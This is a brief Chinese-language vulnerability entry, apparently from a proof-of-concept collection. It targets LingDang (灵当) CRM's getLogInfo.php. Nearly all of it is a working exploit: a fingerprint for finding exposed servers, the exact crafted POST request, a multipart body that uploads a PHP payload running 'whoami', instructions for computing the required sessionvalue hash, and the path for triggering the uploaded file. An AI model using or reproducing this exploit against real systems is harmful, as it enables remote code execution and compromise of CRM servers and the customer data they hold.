# 灵当CRMgetLogInfo.php文件上传致RCE漏洞

- **系统**：灵当CRMgetLogInfo.php文件上传致　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename=rce.php......&callednumber=&sessionvalue=174761f8ccc469f97f36d33341e231ba HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="uploaded_file"; filename="798.avi"
Content-Type: image/jpeg
<?php system("whoami");unlink(__FILE__);?>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
PS：sessionvalue为 uploadfile+上传文件名.php...... 的MD5值
上传定位：GET /crm/storage/mobilecalllog/2025/06/16/rce.php HTTP/1.1
```
- **预期**：200　|　—